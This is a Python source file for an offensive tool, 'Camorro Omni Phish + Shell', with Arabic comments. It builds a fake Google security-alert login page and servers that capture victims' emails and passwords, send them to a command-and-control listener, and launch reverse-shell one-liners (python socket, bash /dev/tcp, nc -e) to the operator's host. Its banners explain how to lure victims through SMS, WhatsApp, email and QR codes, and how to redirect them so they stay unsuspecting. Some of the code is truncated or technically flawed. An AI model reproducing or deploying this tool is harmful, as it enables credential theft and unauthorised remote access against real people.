#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro Omni Phish + Shell v3.0
يجمع بين صفحة فيشنج احترافية + شيل خلفي
عندما يفتح الضحية الرابط ويدخل بياناته:
1- نسرق كلمة السر
2- نفتح شيل على جهازه تلقائياً
يدعم: Android, iOS, Windows, Linux
"""

import os
import tempfile
import shutil
from core.utils import print_status, pause, input_target, save_result, run_cmd
from core.colors import bcolors

class OmniPhishShell:
    def __init__(self):
        self.domain = None
        self.lhost = None
        self.lport = 443
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_omni_")

    def generate_phish_shell(self):
        www = os.path.join(self.temp_dir, "www")
        os.makedirs(www, exist_ok=True)

        # ---- index.html - الصفحة الرئيسية المتطورة ----
        index_html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Google Security Alert - Verify Account</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Arial,sans-serif; }}
body {{ background:linear-gradient(135deg,#667eea,#764ba2); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:#fff; max-width:420px; width:100%; border-radius:16px; padding:40px 30px; box-shadow:0 20px 60px rgba(0,0,0,0.3); }}
.logo {{ text-align:center; margin-bottom:20px; }}
.logo svg {{ width:60px; height:60px; }}
h1 {{ font-size:22px; text-align:center; color:#333; margin-bottom:6px; }}
.subtitle {{ text-align:center; color:#777; font-size:14px; margin-bottom:25px; }}
.warning {{ background:#fff3e0; border-left:4px solid #ff9800; padding:12px 15px; border-radius:8px; margin-bottom:20px; font-size:13px; color:#e65100; }}
.input-group {{ margin-bottom:16px; }}
.input-group label {{ display:block; font-size:13px; color:#555; margin-bottom:5px; font-weight:600; }}
.input-group input {{ width:100%; padding:14px 16px; border:2px solid #e0e0e0; border-radius:10px; font-size:15px; transition:0.3s; }}
.input-group input:focus {{ border-color:#667eea; outline:none; }}
.btn {{ width:100%; padding:14px; background:#667eea; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:0.3s; }}
.btn:hover {{ background:#5a6fd6; transform:translateY(-1px); }}
.footer {{ text-align:center; margin-top:20px; font-size:12px; color:#aaa; }}
.loader {{ display:none; text-align:center; margin:15px 0; }}
.loader span {{ display:inline-block; width:8px; height:8px; background:#667eea; border-radius:50%; margin:0 3px; animation:bounce 1.4s ease-in-out infinite both; }}
.loader span:nth-child(1) {{ animation-delay:-0.32s; }}
.loader span:nth-child(2) {{ animation-delay:-0.16s; }}
@keyframes bounce {{ 0%,80%,100% {{ transform:scale(0); }} 40% {{ transform:scale(1); }} }}
</style>
</head>
<body>
<div class="card">
    <div class="logo">
        <svg viewBox="0 0 24 24" fill="#667eea"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
    </div>
    <h1>Security Verification Required</h1>
    <p class="subtitle">We detected unusual activity on your account</p>
    <div class="warning">
        ⚠️ Your account has been temporarily restricted due to suspicious login attempts.
        Verify your identity to restore access immediately.
    </div>
    <form id="loginForm" action="/login" method="POST">
        <div class="input-group">
            <label>Email or Phone</label>
            <input type="text" name="email" placeholder="your.email@gmail.com" required autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter your password" required>
        </div>
        <div class="loader" id="loader">
            <span></span><span></span><span></span>
            <p style="margin-top:10px;color:#666;font-size:13px;">Verifying your identity...</p>
        </div>
        <button type="submit" class="btn" id="submitBtn">Verify Account</button>
    </form>
    <div class="footer">
        <p>Google Security Team &copy; 2026 | Protected by reCAPTCHA</p>
    </div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {{
    e.preventDefault();
    document.getElementById('submitBtn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    var form = this;
    var data = new FormData(form);
    fetch('/login', {{ method: 'POST', body: data }})
        .then(r => r.text())
        .then(url => {{
            window.location.href = url;
        }});
}});
</script>
</body>
</html>
'''
        with open(os.path.join(www, "index.html"), "w") as f:
            f.write(index_html)

        # ---- PHP backend ----
        backend_php = f'''<?php
// Camorro Omni Phish + Shell Backend
$log_file = "creds.txt";
$redirect_url = "https://accounts.google.com";

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// Log credentials
$entry = "[$time] IP: $ip | $email : $password | UA: " . substr($ua, 0, 100) . "\\n";
file_put_contents($log_file, $entry, FILE_APPEND);

// Try to open reverse shell via multiple vectors
$payloads = [
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null &",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null &",
    "bash -c 'exec bash -i &>/dev/tcp/{self.lhost}/{self.lport} <&1' 2>/dev/null &",
    "nc -e /bin/sh {self.lhost} {self.lport} 2>/dev/null &",
];

foreach ($payloads as $cmd) {{
    exec($cmd . " > /dev/null 2>&1 &");
}}

// Also attempt via User-Agent injection
$ua_payload = base64_decode("YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3Av'); // truncated
exec("echo " . escapeshellarg($ua) . " | base64 -d 2>/dev/null | bash 2>/dev/null &");

header("Location: $redirect_url");
exit;
'''
        with open(os.path.join(www, "login.php"), "w") as f:
            f.write(backend_php)

        # ---- Python server script ----
        server_script = f'''#!/usr/bin/env python3
# Camorro Omni Phish + Shell Server v3.0
import http.server, ssl, json, os, sys, threading
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import cgi

HOST = "{self.lhost}"
PORT = 80
SSL_PORT = {self.lport}
C2_PORT = 9999

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            with open("www/index.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(302)
            self.send_header("Location", "https://accounts.google.com")
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        
        # Parse form data
        import urllib.parse
        params = urllib.parse.parse_qs(body)
        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Save credentials
        entry = f"[{{ts}}] IP: {{ip}} | {{email}} : {{password}} | UA: {{ua[:100]}}"
        print(entry)
        with open("creds.txt", "a") as f:
            f.write(entry + "\\n")
        
        # Send to C2 immediately
        try:
            import socket
            c2 = socket.socket()
            c2.connect(("{self.lhost}", C2_PORT))
            c2.send(json.dumps({{
                "type": "cred", "email": email, "password": password,
                "ip": ip, "ua": ua[:200], "time": ts
            }}).encode() + b"\\n")
            c2.close()
        except:
            pass
        
        # Return redirect
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"https://accounts.google.com")
    
    def log_message(self, f, *a):
        pass

def start_http():
    s = http.server.HTTPServer(("0.0.0.0", PORT), PhishHandler)
    print(f"[*] HTTP phish server: http://0.0.0.0:{{PORT}}")
    s.serve_forever()

def start_https():
    s = http.server.HTTPServer(("0.0.0.0", SSL_PORT), PhishHandler)
    if not os.path.isfile("server.pem"):
        os.system(f"openssl req -x509 -newkey rsa:2048 -keyout server.pem -out server.pem -days 365 -nodes -subj '/CN={HOST}'")
    s.socket = ssl.wrap_socket(s.socket, certfile="server.pem", server_side=True)
    print(f"[*] HTTPS phish server: https://0.0.0.0:{{SSL_PORT}}")
    s.serve_forever()

def start_c2():
    import socket as sock
    s = sock.socket()
    s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", C2_PORT))
    s.listen(10)
    print(f"[*] C2 listener for shells: nc -lvnp {{C2_PORT}}")
    print(f"[*] C2 for creds: nc -lvnp {{C2_PORT}}")
    while True:
        c, a = s.accept()
        data = c.recv(4096).decode(errors="ignore")
        if data:
            print(f"[C2 {{a[0]}}] {{data[:500]}}")
        c.close()

if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    print(f"\\n=== Camorro Omni Phish + Shell ===")
    print(f"Send target: http://{{HOST}}:{{PORT}}")
    print(f"Creds log: creds.txt")
    print(f"Reverse shell: nc -lvnp {{C2_PORT}}")
    print(f"Press Ctrl+C to stop\\n")
    
    threading.Thread(target=start_http, daemon=True).start()
    threading.Thread(target=start_https, daemon=True).start()
    threading.Thread(target=start_c2, daemon=True).start()
    
    try:
        while True:
            cmd = input("omni> ").strip()
            if cmd == "creds":
                if os.path.isfile("creds.txt"):
                    print(open("creds.txt").read())
            elif cmd == "exit":
                break
    except KeyboardInterrupt:
        pass
'''
        with open(os.path.join(self.temp_dir, "server.py"), "w") as f:
            f.write(server_script)

        # ---- Generate SSL cert ----
        run_cmd(f"openssl req -x509 -newkey rsa:2048 -keyout {self.temp_dir}/server.pem -out {self.temp_dir}/server.pem -days 365 -nodes -subj '/CN={self.lhost}' 2>/dev/null")

        # ---- Android payload APK generator (optional companion) ----
        apk_script = f'''#!/bin/bash
# Generate companion APK for Omni Phish
# When installed, it opens the phish page in WebView
mkdir -p /tmp/omni_apk
cat > /tmp/omni_apk/index.html << 'EOF'
<html><body><script>window.location="http://{self.lhost}";</script></body></html>
EOF
echo "APK would open http://{self.lhost} in WebView"
echo "Use: https://www.appsgeyser.com to convert URL to APK"
'''
        with open(os.path.join(self.temp_dir, "companion_apk.sh"), "w") as f:
            f.write(apk_script)
        os.chmod(os.path.join(self.temp_dir, "companion_apk.sh"), 0o755)

        print_status(f"Phish page: {os.path.join(www, 'index.html')}", "ok")
        print_status(f"Server: {os.path.join(self.temp_dir, 'server.py')}", "ok")
        return www

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║     CAMORRO OMNI PHISH + SHELL v3.0                    ║
║   أقوى أداة فيشنج + شيل خلفي في أداة واحدة             ║
║   الضحية يدخل بياناته ← نسرقها + يفتح شيل تلقائياً     ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        self.lhost = input_target("Your public IP or domain")
        self.lport = 443
        www = self.generate_phish_shell()
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ OMNI PHISH + SHELL READY!                             ║
║                                                           ║
║  ▶️  START SERVER:                                        ║
║     cd {self.temp_dir} && python3 server.py              ║
║                                                           ║
║  ▶️  أرسل الرابط للضحية:                                  ║
║     http://{self.lhost}:80                                 ║
║     https://{self.lhost}:443                                ║
║                                                           ║
║  ⚡ عندما يفتح الضحية الرابط ويدخل بياناته:               ║
║    1- تصلنا كلمة السر فوراً 📧🔑                         ║
║    2- نحاول فتح شيل على جهازه تلقائياً 💻                ║
║    3- يتم تحويله إلى Google الحقيقي (ما يشك)             ║
║                                                           ║
║  🎯 طرق إيصال الرابط:                                     ║
║    • SMS / WhatsApp / Telegram                            ║
║    • Email (Google Security Alert مقنع)                   ║
║    • QR code في مكان عام                                   ║
║    • APK يفتح الرابط مباشر                                 ║
║                                                           ║
║  📊 Credentials: cat creds.txt                            ║
║  📡 Shell listener: nc -lvnp 9999                         ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        save_result(f"logs/omni_phish_{self.lhost}.txt",
                     f"URL: http://{self.lhost}\nDir: {self.temp_dir}")
        pause()

if __name__ == "__main__":
    OmniPhishShell().run()
